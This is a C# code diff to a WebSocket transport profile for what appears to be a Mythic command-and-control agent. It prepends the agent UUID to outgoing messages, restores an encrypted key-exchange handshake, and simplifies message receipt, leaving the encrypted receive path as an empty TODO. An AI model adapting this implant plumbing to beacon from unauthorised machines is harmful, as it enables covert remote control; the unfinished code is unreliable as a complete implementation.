@@ -57,6 +57,7 @@ namespace WebsocketTransport
         private Action sendAction;
         private Dictionary<WebSocket, ST.Task> writerTasks = new Dictionary<WebSocket, ST.Task>();
         private string partialData = "";
+        private string Uuid = "";
 
         public WebsocketProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
         {
@@ -64,6 +65,7 @@ namespace WebsocketTransport
             CallbackJitter = double.Parse(data["callback_jitter"]);
             CallbackPort = int.Parse(data["callback_port"]);
             CallbackHost = data["callback_host"];
+            Uuid = agent.GetUUID();
             PostUri = data["post_uri"];
             EncryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
             ProxyHost = data["proxy_host"];
@@ -240,7 +242,7 @@ namespace WebsocketTransport
                 Client.OnClose += OnAsyncDisconnect;
             }
 
-            /*if (EncryptedExchangeCheck && !_uuidNegotiated)
+            if (EncryptedExchangeCheck && !_uuidNegotiated)
             {
                 EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                 {
@@ -249,6 +251,7 @@ namespace WebsocketTransport
                     SessionID = this.rsa.SessionId
                 };
                 AddToSenderQueue(handshake1);
+
                 if (!Recv(MessageType.EKEHandshakeResponse, delegate (IMythicMessage resp)
                 {
                     EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
@@ -260,7 +263,7 @@ namespace WebsocketTransport
                 {
                     return false;
                 }
-            }*/
+            }
 
             AddToSenderQueue(checkinMsg);
             if (agentProcessorTask == null || agentProcessorTask.IsCompleted)
@@ -289,7 +292,7 @@ namespace WebsocketTransport
             WebSocketMessage m = new WebSocketMessage()
             {
                 client = true,
-                data = Convert.ToBase64String(Encoding.UTF8.GetBytes(jsonSerializer.Serialize(msg))),
+                data = Convert.ToBase64String(Encoding.UTF8.GetBytes(Uuid+jsonSerializer.Serialize(msg))),
                 tag = String.Empty
             };
             string message = jsonSerializer.Serialize(m);
@@ -310,25 +313,20 @@ namespace WebsocketTransport
             Console.WriteLine(args.Data);
 
             WebSocketMessage wsm = WebsocketJsonContext.Deserialize<WebSocketMessage>(args.Data);
-            IPCChunkedData chunkedData;
-            try
+
+            string data = Encoding.UTF8.GetString(Convert.FromBase64String(wsm.data)).Substring(36);
+            MessageResponse msg;
+            if (EncryptedExchangeCheck)
             {
-                chunkedData = jsonSerializer.Deserialize<IPCChunkedData>(wsm.data);
-            }
-            catch
+                //TODO
+                return;
+            } else
             {
-                chunkedData = new IPCChunkedData();
-                chunkedData.ID = "";
+                msg = jsonSerializer.Deserialize<MessageResponse>(data);
             }
-            lock (MessageStore)
-            {
-                if (!MessageStore.ContainsKey(chunkedData.ID))
-                {
-                    MessageStore[chunkedData.ID] = new ChunkedMessageStore<IPCChunkedData>();
-                    MessageStore[chunkedData.ID].MessageComplete += DeserializeToReceiverQueue;
-                }
-            }
-            MessageStore[chunkedData.ID].AddMessage(chunkedData);
+
+            recieverQueue.Enqueue(msg);
+            receiverEvent.Set();
         }
 
         public void DeserializeToReceiverQueue(object sender, ChunkMessageEventArgs<IPCChunkedData> args)
